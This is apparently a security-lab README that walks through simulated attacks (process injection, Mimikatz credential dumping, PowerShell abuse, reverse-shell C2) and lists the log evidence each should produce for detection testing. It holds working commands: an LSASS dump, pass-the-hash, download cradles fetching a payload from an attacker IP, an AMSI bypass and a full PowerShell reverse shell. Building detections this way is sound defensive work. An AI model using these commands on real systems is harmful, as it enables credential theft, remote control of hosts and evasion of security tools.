# Attack Simulations

This directory documents attack techniques simulated in the lab. Each section maps to a MITRE ATT&CK tactic and technique, provides step-by-step reproduction instructions, and lists the expected log evidence.

> ⚠️ **Run these techniques only in the isolated lab environment against VMs you own. Never use these against unauthorized systems.**

---

## Table of Contents
1. [Process Injection](#1-process-injection)
2. [Credential Dumping — Mimikatz](#2-credential-dumping--mimikatz)
3. [PowerShell Abuse](#3-powershell-abuse)
4. [Command and Control (C2) Simulation](#4-command-and-control-c2-simulation)

---

## 1. Process Injection

**MITRE ATT&CK**: [T1055 — Process Injection](https://attack.mitre.org/techniques/T1055/)  
**Tactic**: Defense Evasion, Privilege Escalation  
**Platform**: Windows victim VM

### Description
Process injection allows an attacker to run malicious code within the address space of a legitimate process. This evades process-based detection and may inherit the privileges of the host process.

### Common Sub-techniques
- **T1055.001** — DLL Injection
- **T1055.002** — Portable Executable Injection
- **T1055.012** — Process Hollowing

### Steps to Reproduce (using Atomic Red Team)

```powershell
# On Windows victim VM — install Atomic Red Team first
IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing)
Install-AtomicRedTeam -getAtomics

# Run T1055 process injection test
Invoke-AtomicTest T1055 -TestNumbers 1
```

### Expected Log Evidence (Sysmon)
- **Event ID 8** — CreateRemoteThread detected (source process → target process)
- **Event ID 10** — Process accessed with suspicious access rights (e.g., `0x1fffff`)
- **Event ID 1** — Unexpected child process spawned from `explorer.exe` or `svchost.exe`

---

## 2. Credential Dumping — Mimikatz

**MITRE ATT&CK**: [T1003 — OS Credential Dumping](https://attack.mitre.org/techniques/T1003/)  
**Tactic**: Credential Access  
**Platform**: Windows victim VM (run as Administrator)

### Description
Mimikatz extracts plaintext passwords, hashes, Kerberos tickets, and more from Windows memory (LSASS). It is one of the most commonly used post-exploitation tools.

### Steps to Reproduce

```powershell
# Download Mimikatz (use only in the lab environment)
Invoke-WebRequest -Uri https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip `
  -OutFile C:\Tools\mimikatz.zip
Expand-Archive C:\Tools\mimikatz.zip -DestinationPath C:\Tools\mimikatz

# Run Mimikatz — dump LSASS credentials
C:\Tools\mimikatz\x64\mimikatz.exe privilege::debug sekurlsa::logonpasswords exit
```

### Pass-the-Hash (lateral movement)

```bash
# From Kali — using Impacket with dumped NTLM hash
python3 /usr/share/doc/python3-impacket/examples/psexec.py \
  -hashes :<NTLM_HASH> Administrator@<victim-ip>
```

### Expected Log Evidence (Sysmon + Windows Security)
- **Sysmon Event ID 10** — Process access to `lsass.exe` with access rights `0x1010` or `0x1fffff`
- **Windows Security Event ID 4656** — Handle requested for `lsass.exe`
- **Windows Security Event ID 4624** — Logon events after pass-the-hash
- **Windows Security Event ID 4648** — Logon using explicit credentials

---

## 3. PowerShell Abuse

**MITRE ATT&CK**: [T1059.001 — PowerShell](https://attack.mitre.org/techniques/T1059/001/)  
**Tactic**: Execution  
**Platform**: Windows victim VM

### Description
Attackers use PowerShell for execution, download cradles, encoded command obfuscation, and in-memory payload execution — often to avoid writing files to disk.

### Techniques

#### 3a. Encoded Command Execution
```powershell
# Attacker encodes a command to evade simple string matching
$cmd = 'IEX (New-Object Net.WebClient).DownloadString("http://10.10.1.50/payload.ps1")'
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
powershell.exe -EncodedCommand $encoded
```

#### 3b. Download Cradle
```powershell
# Download and execute a remote script in memory
IEX (New-Object Net.WebClient).DownloadString('http://10.10.1.50/payload.ps1')
```

#### 3c. AMSI Bypass (for detection testing)
```powershell
# Common AMSI bypass — test that your SIEM detects it
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

### Expected Log Evidence
- **Sysmon Event ID 1** — `powershell.exe` spawned with `-EncodedCommand` or `-Enc` flags
- **PowerShell ScriptBlock Logging (Event ID 4104)** — decoded script content logged
- **PowerShell Module Logging (Event ID 4103)** — module load events
- **Sysmon Event ID 3** — unexpected outbound network connection from `powershell.exe`
- **Sysmon Event ID 7** — suspicious DLL loaded into PowerShell process

### Enable Enhanced PowerShell Logging (on victim VMs)
```powershell
# Enable Script Block Logging via Group Policy or registry
$basePath = 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell'
New-Item -Path "$basePath\ScriptBlockLogging" -Force
Set-ItemProperty -Path "$basePath\ScriptBlockLogging" -Name EnableScriptBlockLogging -Value 1

# Enable Module Logging
New-Item -Path "$basePath\ModuleLogging" -Force
Set-ItemProperty -Path "$basePath\ModuleLogging" -Name EnableModuleLogging -Value 1
Set-ItemProperty -Path "$basePath\ModuleLogging" -Name ModuleNames -Value '*'
```

---

## 4. Command and Control (C2) Simulation

**MITRE ATT&CK**: [T1071 — Application Layer Protocol](https://attack.mitre.org/techniques/T1071/)  
**Tactic**: Command and Control  
**Platform**: Kali Linux (attacker) → Windows victim VM

### Description
C2 simulation demonstrates how an attacker maintains persistent communication with a compromised host using common protocols (HTTP, HTTPS, DNS) to blend in with normal traffic.

### Steps to Reproduce (Netcat — basic reverse shell)

**On Kali (attacker — 10.10.1.50):**
```bash
# Start listener
nc -lvnp 4444
```

**On Windows victim (via PowerShell or cmd):**
```powershell
# Establish reverse shell
$client = New-Object System.Net.Sockets.TCPClient('10.10.1.50', 4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)
    $sendback = (iex $data 2>&1 | Out-String)
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```

### Beaconing Simulation (for egress detection testing)
```bash
# Simulates periodic C2 beacon — run from victim VM
while($true) {
    Invoke-WebRequest -Uri 'http://10.10.1.50:8080/beacon' -UseBasicParsing
    Start-Sleep -Seconds 60
}
```

### Expected Log Evidence
- **Sysmon Event ID 3** — outbound TCP connection from `powershell.exe` or `cmd.exe` to attacker IP on non-standard port
- **Sysmon Event ID 1** — unusual process with network arguments
- **Security Onion / Zeek** — `conn.log` entries with beaconing interval pattern
- **Security Onion / Suricata** — alert on known reverse shell signatures (if signatures cover it)
- **Wazuh** — rule match on suspicious outbound connection or reverse shell pattern

---

## Detection Coverage Summary

| Technique | MITRE ID | Sysmon Events | Wazuh Rule | Splunk Query |
|-----------|----------|---------------|------------|--------------|
| Process Injection | T1055 | 8, 10 | Yes | See detections/ |
| Credential Dumping | T1003 | 10 | Yes | See detections/ |
| Encoded PowerShell | T1059.001 | 1, 4104 | Yes | See detections/ |
| C2 Reverse Shell | T1071 | 3 | Yes | See detections/ |

See [`../detections/README.md`](../detections/README.md) for all detection rules and queries.
